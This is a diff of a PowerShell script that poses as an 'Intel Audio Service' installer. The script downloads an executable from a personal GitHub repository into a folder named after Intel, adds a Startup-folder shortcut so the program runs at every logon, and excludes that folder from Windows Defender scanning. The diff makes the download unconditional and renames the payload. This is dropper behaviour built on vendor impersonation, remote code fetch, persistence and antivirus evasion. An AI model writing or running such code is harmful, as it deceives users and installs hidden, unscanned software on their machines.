@@ -9,20 +9,15 @@ if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
      }
      
      # Remainder of script here
-
-      if (-Not (test-path -PathType container "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service")) {
+      if (! (test-path -PathType container "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service")) {
             New-Item -ItemType Directory -Path "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service"
       }
-
-      if (-Not (test-path -PathType Any "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\intelaudioservice.exe")) {
-            Invoke-WebRequest -uri "https://github.com/B95segal/intelaudioservice/blob/main/dist/intelaudioservice.exe" -OutFile "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\IntelAudioService.exe"  
-      }
-
+      Invoke-WebRequest -uri "https://github.com/B95segal/intelaudioservice/blob/main/dist/IntelAudIOSvc.exe" -OutFile "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\IntelAudIOSvc.exe"  
 
       $WScriptShell = New-Object -ComObject WScript.Shell
       $FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
-      $ShortcutFile = "$FolderPath\Intel Audio Service.lnk"
-      $TargetFile = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\intelaudioservice.exe"
+      $ShortcutFile = "$FolderPath\IntelAudIOSvc.lnk"
+      $TargetFile = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\IntelAudIOSvc.exe"
       
       If(!(Test-Path $FolderPath)) {
           New-Item -ItemType Directory -Force -Path $FolderPath
@@ -32,7 +27,7 @@ if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
       $Shortcut.TargetPath = $TargetFile
       $Shortcut.Arguments = ""
       $Shortcut.WorkingDirectory = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service"
-      $Shortcut.IconLocation = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\intelaudioservice.exe,0"
+      $Shortcut.IconLocation = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\IntelAudIOSvc.exe,0"
       $Shortcut.Save()
 
       Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\"
